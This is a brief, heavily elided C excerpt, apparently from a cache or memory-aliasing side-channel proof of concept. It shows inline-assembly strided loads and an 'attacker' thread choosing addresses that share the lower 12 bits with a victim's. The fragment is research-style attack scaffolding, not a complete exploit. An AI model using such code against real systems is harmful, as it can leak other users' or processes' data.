...
static inline __attribute__((always_inline)) void reads(char *ptr) {
	asm volatile (
		// "mov %0, %%r8 \n\t"
        "movdqu 0x0000(%0), %%xmm0\n\t"
        "movdqu 0x1000(%0), %%xmm0\n\t" 
        "movdqu 0x2000(%0), %%xmm0\n\t" 
        "movdqu 0x3000(%0), %%xmm0\n\t" 
        "movdqu 0x4000(%0), %%xmm0\n\t" 
        "movdqu 0x5000(%0), %%xmm0\n\t" 
        "movdqu 0x6000(%0), %%xmm0\n\t" 
        "movdqu 0x7000(%0), %%xmm0\n\t"
        :
        : "r" (ptr)
        : 
    );
...
void *attacker(void *args) {
	...
	uint64_t start, end;
	char *ptr_diff = mem + 0xA000; // Different address as victim
	char *ptr_lower_match = mem + OFFSET + 0xA000; // Same lower 12 bits as victim
